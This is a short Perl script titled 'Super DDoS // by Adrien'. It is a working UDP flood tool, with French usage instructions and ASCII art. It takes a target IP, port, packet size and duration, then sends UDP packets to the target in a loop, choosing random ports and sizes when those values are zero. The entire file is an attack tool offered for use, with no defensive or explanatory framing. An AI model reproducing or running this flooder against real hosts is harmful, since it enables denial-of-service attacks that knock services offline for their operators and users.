#!/usr/bin/perl

##############
# udp flood.
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print " \n";
  print "Super DDoS // by Adrien\n\n";
  print "Commande: flood.pl <ip> <port> <packets> <temps(en secondes)>\n";
  print " port: le port à flood. Mettez 0 pour tous.\n";
  print " packets: le nombre de packets à envoyer. Entre 64 et 1024.\n";
  print " temps: le temps de flood en secondes.\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Impossible de se connecter à $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

 
print "   
                         QQQQQQQ
                        QQQQQQQQ
                       QQQQQQQQQQ
                      QQQQQQQQQQQQQ
                    QQQQQQQQQQQQQQ
                    QQQQQQQQQQQQQ
                     QQQQQQQQQQQ
                       QQQQQQQ
                         QQQ
Potato (not)Swegging $ip from port port " . ($port ? $port : "random") . ", Sweg " . 
  ($size ? "$size-byte" : "random size") . " packets" . 
  ($time ? " for $time secondes" : "") . "\n";
print "Attaque arrêtée avec Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}